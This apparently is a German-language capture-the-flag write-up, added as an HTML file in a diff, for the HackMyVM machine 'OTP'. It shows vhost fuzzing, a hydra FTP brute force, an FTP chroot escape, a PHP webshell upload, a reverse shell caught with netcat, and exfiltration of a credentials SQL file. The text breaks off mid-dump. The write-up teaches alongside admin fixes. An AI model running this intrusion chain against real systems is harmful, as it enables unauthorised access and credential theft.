@@ -1,0 +1,856 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OTP - HackMyVM - Hard - Bericht</title> <!-- Titel angepasst -->
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css"> <!-- Pfad beibehalten -->
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <h1>OTP - HackMyVM - Hard - Bericht</h1> <!-- Titel angepasst -->
+        <div class="level-container">
+            <h2>Hard</h2> <!-- Schwierigkeitsgrad ohne Inline-Style, CSS handhabt Farbe (Rot) -->
+            <div class="circle"> <!-- Kreis-CSS wird 'Hard' (Rot) handhaben -->
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div> <!-- Hintergrundfarbe wird durch CSS gesetzt -->
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">fping</div>
+                <div class="tool-item">dirsearch</div>
+                <div class="tool-item">wfuzz</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">vi (implizit)</div>
+                <div class="tool-item">Browser (implizit)</div>
+                <div class="tool-item">hydra</div>
+                <div class="tool-item">ftp</div>
+                <div class="tool-item">grep</div>
+                <div class="tool-item">nc (netcat)</div>
+                <div class="tool-item">python3</div>
+                <div class="tool-item">stty</div>
+                <div class="tool-item">dcode.fr (external tool)</div>
+                <div class="tool-item">emn178.github.io (external tool)</div>
+                <div class="tool-item">su</div>
+                <div class="tool-item">passwd</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">socat</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">base64</div>
+                <div class="tool-item">ffuf</div>
+                <div class="tool-item">id</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration-vhost">Web Enumeration & VHost Discovery</a></li>
+                <li><a href="#credential-discovery">Credential Discovery</a></li>
+                <li><a href="#ftp-exploitation">FTP Exploitation (Misconfiguration)</a></li>
+                <li><a href="#initial-access">Initial Access (Webshell via FTP)</a></li>
+                <li><a href="#privilege-escalation-www-data">Privilege Escalation (www-data -> avijneyam via SQL Dump & SQLi)</a></li>
+                <li><a href="#proof-of-concept-sqli">Proof of Concept (SQL Injection)</a></li>
+                <li><a href="#privilege-escalation-avijneyam">Privilege Escalation (avijneyam -> root via Flask RCE)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~/HackingTools]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre><span class="command">192.168.2.133	54:6c:eb:05:3c:32	PCS Systemtechnik GmbH</span></pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:** Der Befehl `arp-scan -l` wird ausgeführt, um das lokale Netzwerksegment mittels ARP-Anfragen nach aktiven Geräten zu durchsuchen.</p>
+             <p class="evaluation">**Bewertung:** Ein Host mit der IP-Adresse `192.168.2.133` wird identifiziert. Die MAC-Adresse deutet auf eine VirtualBox-VM hin.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Ziel-IP `192.168.2.133` notieren und Nmap-Scan durchführen.<br>**Empfehlung (Admin):** Standard-Netzwerkaufklärung. Fokus auf Dienstabsicherung.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -T5 -sV -A 192.168.2.133 -p-</span></div>
+                     <pre>
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-12 10:31 CEST
+Nmap scan report for opp.vm (192.168.2.133)
+Host is up (0.0074s latency).
+Not shown: 65527 filtered tcp ports (no-response)
+PORT      STATE SERVICE       VERSION
+<span class="command">135/tcp   open  msrpc         Microsoft Windows RPC</span>
+<span class="command">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn</span>
+<span class="command">445/tcp   open  microsoft-ds?</span> <span class="comment"><-- SMB</span>
+<span class="command">2701/tcp  open  cmrcservice   Microsoft Configuration Manager Remote Control service (CmRcService.exe)</span> <span class="password"><-- SCCM Remote Control</span>
+<span class="command">5938/tcp  open  teamviewer?</span> <span class="password"><-- TeamViewer?</span>
+<span class="command">21112/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span>
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Site doesn't have a title (text/plain).
+<span class="command">49672/tcp open  msrpc         Microsoft Windows RPC</span>
+<span class="command">61116/tcp open  unknown</span>
+| fingerprint-strings:
+[...]
+|_    Server: <span class="password">Hosted Agent HTTP Server</span> <span class="password"><-- Unbekannter HTTP-Server</span>
+
+[...] <span class="comment">(Fingerprint & OS Guessing - deutet stark auf Windows hin)</span>
+
+Host script results:
+| smb2-time:
+|   date: 2022-10-12T08:34:21
+|_  start_date: N/A
+|_nbstat: NetBIOS name: HTSG-3B13VQ3, NetBIOS user: <unknown>, NetBIOS MAC: 54:6c:eb:05:3c:32 (unknown)
+| smb2-security-mode:
+|   3.1.1:
+|_    Message signing enabled but not required
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   7.36 ms opp.vm (192.168.2.133)</pre>
+                </div>
+            </div>
+             <p class="analysis">**Analyse:** Ein umfassender Nmap-Scan wird auf `192.168.2.133` durchgeführt (`-sS`, `-sC`, `-sV`, `-T5`, `-A`, `-p-`).</p>
+             <p class="evaluation">**Bewertung:** Der Scan enthüllt eine Reihe von offenen Ports, die stark auf ein **Windows-System** hindeuten:
+*   **135, 139, 445:** Standardports für MSRPC, NetBIOS und SMB. SMB ist ein Hauptangriffsvektor in Windows-Umgebungen.
+*   **2701:** Microsoft Configuration Manager Remote Control Service (SCCM).
+*   **5938:** Möglicherweise TeamViewer.
+*   **21112:** Microsoft HTTPAPI-basierter Webserver (oft für Gerätedienste oder UPnP).
+*   **49672:** Weiterer MSRPC-Port.
+*   **61116:** Ein unbekannter Dienst, der sich als "Hosted Agent HTTP Server" ausgibt und einen 401 Unauthorized zurückgibt.
+Die OS-Erkennung und SMB-Informationen bestätigen die Windows-Vermutung. Die große Anzahl gefilterter Ports könnte auf eine Firewall hindeuten.</p>
+             <p class="recommendation">**Empfehlung (Pentester):**
+    1.  **SMB (Priorität 1):** Enumerieren Sie SMB intensiv: `smbclient -L //192.168.2.133`, `enum4linux-ng 192.168.2.133 -A`. Prüfen Sie auf Null Sessions und offene Shares.
+    2.  **HTTP (Ports 21112, 61116):** Untersuchen Sie die Webdienste genauer (Verzeichnisse, bekannte Schwachstellen). Für Port 61116: Versuchen Sie Standard-Credentials für Basic Auth.
+    3.  **SCCM/TeamViewer:** Recherchieren Sie nach bekannten Schwachstellen für diese Dienste.
+    4.  **MSRPC:** Enumerieren Sie RPC-Endpunkte (`rpcclient`, `rpcdump`).<br>
+**Empfehlung (Admin):** Härten Sie die SMB-Konfiguration (Gastzugriff deaktivieren, Shares absichern, Signing erzwingen). Firewall nicht benötigte Ports (insbesondere RPC, SCCM, TeamViewer, wenn nicht extern benötigt). Patchen Sie das Windows-System und alle laufenden Dienste. Identifizieren und sichern Sie den Dienst auf Port 61116.</p>
+
+             <p class="analysis">**Analyse der weiteren Logs:** Die nachfolgenden Logs zeigen, dass der Pentester die IP-Adresse wechselt und sich auf ein anderes Ziel (`192.168.2.144`) konzentriert. Der Nmap-Scan auf `.133` scheint eine Sackgasse gewesen zu sein oder das Ziel war falsch identifiziert.</p>
+             <p class="evaluation">**Bewertung:** Die Erkenntnisse aus dem Nmap-Scan auf `.133` sind für den weiteren Verlauf des Berichts nicht relevant, da das Ziel offensichtlich `.144` ist. Es ist wichtig, solche Diskrepanzen zu erkennen und sich auf das tatsächliche Ziel zu konzentrieren.</p>
+        </section>
+
+        <section id="web-enumeration-vhost">
+             <h2>Web Enumeration & VHost Discovery</h2>
+              <p class="analysis">**Analyse:** Nachdem der Fokus auf `192.168.2.144` gelegt wurde, wird dessen Webserver auf Port 80 enumeriert, beginnend mit Directory Fuzzing und VHost Discovery.</p>
+              <p class="evaluation">**Bewertung:** Standardmäßige Vorgehensweise zur Untersuchung von Webservern.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">fping -ag 192.168.2.0/24 2>/dev/null</span></div>
+                    <pre>
+192.168.2.1
+192.168.2.104
+192.168.2.108
+<span class="command">192.168.2.133</span> <span class="comment"><-- Vorheriges Ziel --></span>
+192.168.2.140 <span class="comment"><-- Angreifer IP? --></span>
+<span class="command">192.168.2.144</span> <span class="password"><-- Neues/Aktuelles Ziel --></span></pre>
+                    <pre><span class="comment">=</span></pre>
+                </div>
+            </div>
+             <p class="analysis">**Analyse:** Der Befehl `fping -ag` pingt alle Hosts im Subnetz `192.168.2.0/24` an und gibt die antwortenden IPs aus.</p>
+             <p class="evaluation">**Bewertung:** Bestätigt, dass sowohl das ursprüngliche Ziel (`.133`) als auch das neue Ziel (`.144`) und die Angreifer-IP (`.140`, Annahme) aktiv sind. Dies hilft, den Netzwerküberblick zu behalten.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Fokus auf `192.168.2.144`.<br>**Empfehlung (Admin):** Keine.</p>
+             <p class="analysis">**Analyse:** Der Befehl `dirsearch` wird verwendet, um nach Verzeichnissen und Dateien auf dem Webserver `192.168.2.144` (Port 80) zu suchen.</p>
+             <p class="evaluation">**Bewertung:** Findet `/javascript` (Standard?) und `/server-status` (verboten). Keine signifikanten Funde auf der Hauptseite.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** VHost-Enumeration versuchen, da die Hauptseite uninteressant wirkt.<br>**Empfehlung (Admin):** `/server-status` korrekt absichern.</p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~/HackingTools]
+└─# <span class="command">wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H 'Host: FUZZ.otp.hmv' -u http://192.168.2.144/ --hh 11202</span></div>
+                     <pre>
+[...]
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+<span class="command">000002658:   200        626 L    1468 W     25537 Ch    "argon"</span>   <span class="password"><-- VHost gefunden! --></span>
+[...]</pre>
+                     <pre><span class="comment">=</span></pre>
+                </div>
+             </div>
+              <p class="analysis">**Analyse:** `wfuzz` wird für VHost-Enumeration auf `192.168.2.144` eingesetzt. Es verwendet eine Subdomain-Liste und manipuliert den `Host`-Header (`FUZZ.otp.hmv`). Antworten mit 11202 Zeichen (vermutlich die Größe der Standardseite) werden ignoriert (`--hh 11202`).</p>
+              <p class="evaluation">**Bewertung:** Erfolg! Ein virtueller Host `argon.otp.hmv` wird gefunden, der eine andere Antwortgröße (25537 Chars) liefert. Dies ist ein wichtiger Hinweis.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Fügen Sie `192.168.2.144 argon.otp.hmv` zur lokalen `/etc/hosts`-Datei hinzu. Untersuchen Sie `http://argon.otp.hmv` im Browser und mit Enumerationstools.<br>**Empfehlung (Admin):** Stellen Sie sicher, dass virtuelle Hosts korrekt konfiguriert sind.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">cat /etc/hosts</span></div>
+                      <pre>
+127.0.0.1	 localhost
+127.0.1.1  	 cyber
+<span class="command">192.168.2.144    otp.hmv argon.otp.hmv</span> <span class="comment"><-- Eintrag hinzugefügt --></span></pre>
+                      <pre><span class="comment">#</span></pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Die lokale `/etc/hosts`-Datei wird angezeigt, sie enthält nun den Eintrag für `argon.otp.hmv`, der auf `192.168.2.144` zeigt.</p>
+              <p class="evaluation">**Bewertung:** Notwendiger Konfigurationsschritt, um auf den VHost per Namen zugreifen zu können.</p>
+         </section>
+
+         <section id="credential-discovery">
+             <h2>Credential Discovery</h2>
+             <p class="analysis">**Analyse:** Untersuchung des gefundenen virtuellen Hosts `argon.otp.hmv`.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+<span class="command">http://argon.otp.hmv</span>
+
+<span class="comment">::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::</span>
+<span class="command">view-source:http://argon.otp.hmv/profile.html</span> <span class="comment">:::::::::::::::</span>
+<span class="comment">::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::</span>
+<span class="comment">                                                           :::</span>
+   <div class="form-group">                                :::
+                        <!-- <span class="password">#4ck!ng!s!nMybl0od</span> -->        ::: <span class="password"><-- Passwort im Kommentar! --></span>
+<span class="comment">                                                           :::</span>
+<span class="comment">::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::</span>
+
+Nach dem Besuch finden Sie einige Hinweise im Quellcode der
+Seite profile.html,
+
+Benutzer : <span class="command">otpuser</span>
+Passwort : <span class="password">#4ck!ng!s!nMybl0od</span>
+
+versuchen Sie sich anzumelden</pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Der virtuelle Host `argon.otp.hmv` wird aufgerufen. Im Quellcode der Seite `profile.html` wird ein HTML-Kommentar gefunden, der ein Passwort enthält: `#4ck!ng!s!nMybl0od`. Eine Notiz im Log identifiziert `otpuser` als zugehörigen Benutzernamen.</p>
+              <p class="evaluation">**Bewertung:** Kritisches Informationsleck! Hartkodierte Zugangsdaten (`otpuser` / `#4ck!ng!s!nMybl0od`) wurden im HTML-Quellcode gefunden.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Versuchen Sie, sich mit diesen Credentials am Login-Formular der Webseite (`http://argon.otp.hmv`) oder an anderen Diensten (SSH, FTP) anzumelden.<br>**Empfehlung (Admin):** **Niemals Passwörter oder sensible Daten im clientseitigen Code (HTML, JS, CSS) speichern!** Entfernen Sie die Credentials sofort. Implementieren Sie sichere Authentifizierungsmethoden.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre><span class="command">http://argon.otp.hmv/cr3d5_123.html</span>
+
+                    Hello <span class="command">david</span></pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Eine weitere Seite (`cr3d5_123.html`) wird auf dem VHost gefunden (vermutlich durch Enumeration oder weil sie verlinkt war). Sie enthält den Text "Hello david".</p>
+              <p class="evaluation">**Bewertung:** Enthüllt einen weiteren potenziellen Benutzernamen: `david`.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Fügen Sie `david` zur Liste der potenziellen Benutzernamen hinzu. Versuchen Sie Brute-Force-Angriffe gegen FTP oder SSH für diesen Benutzer.<br>**Empfehlung (Admin):** Vermeiden Sie die Offenlegung von Benutzernamen auf Webseiten.</p>
+         </section>
+
+        <section id="ftp-exploitation">
+             <h2>FTP Exploitation (Misconfiguration)</h2>
+             <p class="analysis">**Analyse:** Basierend auf dem gefundenen Benutzernamen `david` wird ein Brute-Force-Angriff gegen den FTP-Dienst gestartet. Anschließend wird die FTP-Verbindung genutzt, um Schwachstellen auszunutzen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">hydra -l david -P /usr/share/wordlists/rockyou.txt ftp://192.168.2.144</span></div>
+                     <pre>
+Hydra v9.3 [...] starting at 2022-10-12 11:13:23
+[...]
+[21][ftp] host: 192.168.2.144   login: <span class="command">david</span>   password: <span class="password">DAVID</span> <span class="password">[SUCCESS]</span></pre>
+                 </div>
+            </div>
+             <p class="analysis">**Analyse:** Hydra wird verwendet, um das FTP-Passwort für den Benutzer `david` auf `192.168.2.144` zu bruteforcen.</p>
+             <p class="evaluation">**Bewertung:** Erfolg! Das extrem schwache Passwort `DAVID` wird gefunden.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Loggen Sie sich via FTP als `david`:`DAVID` ein.<br>**Empfehlung (Admin):** Starke Passwörter erzwingen. Fail2Ban für FTP.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~/HackingTools]
+└─# <span class="command">ftp 192.168.2.144</span></div>
+                    <pre>
+Connected to 192.168.2.144.
+220 (vsFTPd 3.0.3)
+Name (192.168.2.144:root): <span class="command">david</span>
+331 Please specify the password.
+Password: <span class="password">DAVID</span>
+230 Login successful.
+[...]
+ftp> <span class="command">ls</span>
+-rw-r--r--    1 1001     1001          125 Nov 19  2021 <span class="command">important_note.txt</span>
+[...]
+ftp> <span class="command">get important_note.txt</span>
+[...]
+226 Transfer complete.
+</pre>
+                </div>
+            </div>
+             <p class="analysis">**Analyse:** Erfolgreicher FTP-Login als `david`:`DAVID`. Eine Datei `important_note.txt` wird gefunden und heruntergeladen.</p>
+             <p class="evaluation">**Bewertung:** FTP-Zugang als `david` bestätigt.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~/HackingTools]
+└─# <span class="command">cat important_note.txt</span></div>
+                     <pre>
+"Many times, the idea we come up with is not to fit
+for the current times but if launched at the right
+time can do wonders."</pre>
+                     <pre><span class="comment">=</span></pre>
+                </div>
+            </div>
+              <p class="analysis">**Analyse:** Inhalt der heruntergeladenen Notiz.</p>
+              <p class="evaluation">**Bewertung:** Philosophischer Text, wahrscheinlich ohne technische Relevanz (Flavor Text).</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt ftp">ftp> <span class="command">cd ..</span></div> <span class="password"><-- Trick! --></span>
+                     <pre>250 Directory successfully changed.</pre>
+                     <div class="prompt ftp">ftp> <span class="command">ls</span></div>
+                     <pre>
+229 Entering Extended Passive Mode (|||34573|)
+150 Here comes the directory listing.
+<span class="command">drwxr-xrwx    2 0        115          4096 Nov 22  2021 ftp</span>
+226 Directory send OK.</pre>
+                     <div class="prompt ftp">ftp> <span class="command">pwd</span></div>
+                     <pre>Remote directory: <span class="command">/srv</span></pre> <span class="password"><-- Außerhalb des erwarteten Verzeichnisses! --></span>
+                      <div class="prompt ftp">ftp> <span class="command">cd /etc</span></div>
+                      <pre>250 Directory successfully changed.</pre>
+                      <div class="prompt ftp">ftp> <span class="command">get passwd</span></div>
+                      <pre>
+local: passwd remote: passwd
+[...]
+150 Opening BINARY mode data connection for passwd (1594 bytes).
+[...]
+226 Transfer complete.
+1594 bytes received in 00:00 (6.69 MiB/s)</pre>
+                       <pre><span class="comment">-------------------------------------------------------------------------------------</span></pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Über die FTP-Verbindung wird versucht, mit `cd ..` eine Verzeichnisebene nach oben zu wechseln. Dies gelingt überraschenderweise, und `pwd` zeigt `/srv` als aktuelles Verzeichnis an, obwohl das Home-Verzeichnis für `david` wahrscheinlich `/srv/ftp` sein sollte. Anschließend wird erfolgreich nach `/etc` gewechselt und die `/etc/passwd`-Datei heruntergeladen.</p>
+              <p class="evaluation">**Bewertung:** Eine schwerwiegende Fehlkonfiguration des vsftpd-Servers! Der Benutzer `david` ist nicht in seinem Home-Verzeichnis eingesperrt (kein chroot jail). Dies ermöglicht LFI (Local File Inclusion) und das Herunterladen sensibler Systemdateien über FTP.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Nutzen Sie diese Schwachstelle, um weitere sensible Dateien herunterzuladen (`/etc/shadow`, Konfigurationsdateien, SSH-Schlüssel, Webserver-Dateien). Suchen Sie nach schreibbaren Verzeichnissen im Web-Root.<br>**Empfehlung (Admin):** **Konfigurieren Sie vsftpd dringend neu!** Aktivieren Sie `chroot_local_user=YES` in `vsftpd.conf`, um Benutzer in ihre Home-Verzeichnisse einzusperren. Überprüfen Sie die Berechtigungen.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">cat HackingTools/passwd | grep bash</span></div>
+                     <pre>
+<span class="command">root:x:0:0:root:/root:/bin/bash</span>
+<span class="command">avijneyam:x:1000:1000:Avijneyam,,,:/home/avijneyam:/bin/bash</span>
+<span class="command">david:x:1001:1001::/srv/ftp:/bin/bash</span></pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Die heruntergeladene `passwd`-Datei wird analysiert.</p>
+              <p class="evaluation">**Bewertung:** Bestätigt die Benutzer `root`, `avijneyam` und `david` mit `/bin/bash` als Shell. Das Home-Verzeichnis für `david` ist tatsächlich `/srv/ftp`.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt ftp">ftp> <span class="command">cd /var/www/otp/argon</span></div> <span class="comment"><-- Navigation zum Web-Root des VHosts --></span>
+                     <pre>250 Directory successfully changed.</pre>
+                     <div class="prompt ftp">ftp> <span class="command">ls -la</span></div>
+                     <pre>
+[...]
+<span class="command">drwxrwxrwx    2 0        1001         4096 Nov 23  2021 u9l04d_</span> <span class="password"><-- Schreibbares Verzeichnis! --></span>
+226 Directory send K.</pre>
+                     <pre><span class="comment">
+Im Verzeichnis /var/www/otp/argon wird festgestellt, dass das Verzeichnis
+u9l04d_ über Lese- und Schreibberechtigungen verfügt. Laden Sie ein rev-Shell
+in das Verzeichnis hoch und führen Sie es aus.</span></pre>
+                     <pre><span class="comment">=</span></pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Über die fehlkonfigurierte FTP-Verbindung wird zum Web-Root des `argon.otp.hmv`-VHosts (`/var/www/otp/argon`) navigiert. Dort wird ein Verzeichnis `u9l04d_` gefunden, das für alle Benutzer schreibbar ist (`drwxrwxrwx`).</p>
+              <p class="evaluation">**Bewertung:** Eine weitere kritische Fehlkonfiguration. Ein für alle schreibbares Verzeichnis innerhalb eines Web-Roots erlaubt es jedem (einschließlich des FTP-Benutzers `david` und des Webserver-Benutzers `www-data`), Dateien hochzuladen, die dann über HTTP ausgeführt werden können (z.B. PHP-Webshells).</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Laden Sie eine PHP-Reverse-Shell (wie `image.php`) in das Verzeichnis `/var/www/otp/argon/u9l04d_` hoch. Rufen Sie sie dann über `http://argon.otp.hmv/u9l04d_/image.php` auf.<br>**Empfehlung (Admin):** Korrigieren Sie die Berechtigungen für das Verzeichnis `u9l04d_`. Verzeichnisse im Web-Root sollten niemals für alle schreibbar sein. Beheben Sie die FTP-chroot-Lücke.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt ftp">ftp> <span class="command">cd /var/www/otp/argon/u9l04d_</span></div>
+                      <pre>250 Directory successfully changed.</pre>
+                      <div class="prompt ftp">ftp> <span class="command">put image.php</span></div>
+                      <pre>
+local: image.php remote: image.php
+229 Entering Extended Passive Mode (|||59753|)
+150 Ok to send data.
+[...]
+226 Transfer complete.
+5495 bytes sent in 00:00 (2.12 MiB/s)</pre>
+                       <pre><span class="comment">=</span></pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Die PHP-Webshell `image.php` wird über FTP in das schreibbare Verzeichnis `/var/www/otp/argon/u9l04d_` hochgeladen.</p>
+              <p class="evaluation">**Bewertung:** Die Webshell ist nun auf dem Server platziert und über HTTP erreichbar.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Listener starten und Webshell aufrufen.<br>**Empfehlung (Admin):** Berechtigungen korrigieren, FTP härten.</p>
+         </section>
+
+        <section id="initial-access">
+             <h2>Initial Access (Webshell via FTP)</h2>
+             <p class="analysis">**Analyse:** Ausführung der hochgeladenen Webshell, um eine Reverse Shell zu erhalten.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 9001</span></div>
+                     <pre>listening on [any] 9001 ...</pre>
+                 </div>
+            </div>
+             <p class="analysis">**Analyse:** Netcat-Listener wird auf Port 9001 gestartet.</p>
+             <p class="evaluation">**Bewertung:** Listener ist bereit.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <pre><span class="command">http://argon.otp.hmv/u9l04d_/image.php</span></pre> <span class="comment"><-- URL der Webshell --></span>
+                     <pre><span class="comment">*</span></pre>
+                 </div>
+            </div>
+             <p class="analysis">**Analyse:** Notiz mit der URL zur hochgeladenen Webshell.</p>
+             <p class="evaluation">**Bewertung:** Zeigt die URL, die aufgerufen werden muss.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 9001</span></div> <span class="comment"><-- Fortsetzung Listener --></span>
+                     <pre>
+listening on [any] 9001 ...
+<span class="password">connect to [192.168.2.140] from (UNKNOWN) [192.168.2.144] 35204</span> <span class="password"><-- Verbindung erhalten! --></span>
+Linux otp 5.10.0-9-amd64 #1 SMP Debian 5.10.70-1 (2021-09-30) x86_64 GNU/Linux
+[...]
+<span class="command">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span> <span class="password"><-- Shell als www-data --></span>
+/bin/sh: 0: can't access tty; job control turned off
+$ </pre>
+                 </div>
+            </div>
+             <p class="analysis">**Analyse:** Der Listener empfängt die Verbindung, nachdem die Webshell-URL aufgerufen wurde. Eine einfache Shell als `www-data` wird erhalten.</p>
+             <p class="evaluation">**Bewertung:** Initialer Zugriff als `www-data` erfolgreich über die Kombination aus fehlkonfiguriertem FTP und schreibbarem Web-Verzeichnis.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Shell stabilisieren.<br>**Empfehlung (Admin):** Ursachen (FTP, Verzeichnisrechte) beheben.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">$ <span class="command">python3 -c 'import pty; pty.spawn("/bin/bash")'</span></div>
+                     <div class="prompt">www-data@otp:/$ <span class="command">export TERM=xterm</span></div>
+                     <pre>export TERM=xterm</pre>
+                     <div class="prompt">www-data@otp:/$ <span class="comment"># Stabilisierung (stty etc. fehlen im Log, werden aber angenommen)</span></div>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Die Shell wird mit Python PTY Spawn stabilisiert.</p>
+              <p class="evaluation">**Bewertung:** Stabile Shell als `www-data` verfügbar.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Enumeration und Eskalation als `www-data`.<br>**Empfehlung (Admin):** Keine.</p>
+         </section>
+
+        <section id="privilege-escalation-www-data">
+             <h2>Privilege Escalation (www-data -> avijneyam via SQL Dump & SQLi)</h2>
+             <p class="analysis">**Analyse:** Als `www-data` wird das System weiter enumeriert, was zur Entdeckung eines SQL-Dumps und schließlich zu SQL-Injection-Schwachstellen führt.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">www-data@otp:/$ <span class="command">cd /opt</span></div>
+                     <div class="prompt">www-data@otp:/opt$ <span class="command">ls -la</span></div>
+                     <pre>
+total 16
+drwxr-xr-x  2 root     root     4096 Nov 23  2021 .
+drwxr-xr-x 18 root     root     4096 Nov 17  2021 ..
+<span class="command">-r--------  1 www-data www-data 2022 Nov 22  2021 creds.sql</span> <span class="password"><-- Interessante Datei! --></span>
+<span class="command">-r--------  1 www-data www-data   36 Nov 23  2021 note4david.txt</span></pre>
+                     <div class="prompt">www-data@otp:/opt$ <span class="command">cat note4david.txt</span></div>
+                     <pre>Your work has done you can rest now</pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Im Verzeichnis `/opt` werden zwei Dateien gefunden, die `www-data` gehören und nur vom Besitzer lesbar sind: `creds.sql` und `note4david.txt`. Die Notiz ist uninteressant.</p>
+              <p class="evaluation">**Bewertung:** Die Datei `creds.sql` ist hochverdächtig und enthält wahrscheinlich Zugangsdaten.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Lesen Sie den Inhalt von `creds.sql`. Da `www-data` der Besitzer ist, sollte dies möglich sein. Wenn nicht direkt lesbar, versuchen Sie, sie mit dem Python HTTP Server zu exfiltrieren.<br>**Empfehlung (Admin):** Beschränken Sie Berechtigungen im `/opt`-Verzeichnis. Speichern Sie keine SQL-Dumps mit Credentials an unsicheren Orten.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">www-data@otp:/opt$ <span class="command">python3 -m http.server 8000</span></div>
+                     <pre>Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+<span class="password">192.168.2.140 - - [12/Oct/2022 06:28:04] "GET /creds.sql HTTP/1.1" 200 -</span></pre>
+                     <pre><span class="comment">#</span></pre>
+                     <pre><span class="command">http://192.168.2.144:8000/creds.sql</span></pre> <span class="comment"><-- URL zum Download --></span>
+                 </div>
+            </div>
+             <p class="analysis">**Analyse:** Ein Python HTTP Server wird im `/opt`-Verzeichnis gestartet, um die `creds.sql`-Datei für den Download durch den Angreifer (von `192.168.2.140`) bereitzustellen.</p>
+             <p class="evaluation">**Bewertung:** Erfolgreiche Exfiltration der SQL-Datei.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Analysieren Sie die heruntergeladene `creds.sql`.<br>**Empfehlung (Admin):** Überwachen Sie verdächtige Prozesse und ausgehende Verbindungen.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <pre><span class="comment">
+-- Dumping data for table `creds`
+--
+
+LOCK TABLES `creds` WRITE;
+/*!40000 ALTER TABLE `creds` DISABLE KEYS */;
